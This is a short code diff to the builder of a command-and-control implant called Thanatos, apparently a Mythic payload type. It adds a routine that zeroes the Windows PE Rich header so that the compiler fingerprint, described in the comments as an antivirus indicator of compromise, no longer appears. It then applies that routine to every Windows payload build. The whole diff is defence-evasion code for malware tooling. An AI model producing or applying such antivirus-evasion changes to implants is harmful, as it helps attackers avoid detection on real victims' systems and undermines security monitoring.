@@ -122,6 +122,26 @@ class Thanatos(PayloadType):
     agent_code_path = pathlib.Path(".") / "thanatos" / "agent_code"
     agent_icon_path = agent_path / "agent_icon" / "thanatos.svg"
 
+    @staticmethod
+    def _strip_rich_header(data: bytearray) -> bytearray:
+        """Zero out the Rich header between DOS stub and PE signature.
+        The Rich header identifies the compiler toolchain (MinGW) which is an AV IOC."""
+        import struct
+        # Find "Rich" marker
+        rich_offset = data.find(b"Rich")
+        if rich_offset == -1:
+            return data
+        # Rich header ends 8 bytes after "Rich" (4 bytes marker + 4 bytes XOR key)
+        rich_end = rich_offset + 8
+        # PE header offset is at 0x3C
+        pe_offset = struct.unpack_from("<I", data, 0x3C)[0]
+        # DOS stub ends at 0x80 typically, Rich header is between DOS stub and PE
+        # Zero everything from 0x80 to rich_end
+        dos_stub_end = 0x80
+        for i in range(dos_stub_end, min(rich_end, pe_offset)):
+            data[i] = 0x00
+        return data
+
     # This function is called to build a new payload
     async def build(self) -> BuildResponse:
         # Setup a new build response object
@@ -305,7 +325,13 @@ class Thanatos(PayloadType):
                 f"{agent_build_path.name}/target/{target_os}/release/{target_name}"
             )
             with open(payload_path, "rb") as f:
-                resp.payload = f.read()
+                payload_bytes = bytearray(f.read())
+
+            # Strip Rich header (identifies MinGW compiler — AV IOC)
+            if self.selected_os == SupportedOS.Windows:
+                payload_bytes = self._strip_rich_header(payload_bytes)
+
+            resp.payload = bytes(payload_bytes)
 
             # Notify Mythic that the build was successful
             resp.set_build_message("Successfully built thanatos agent.")
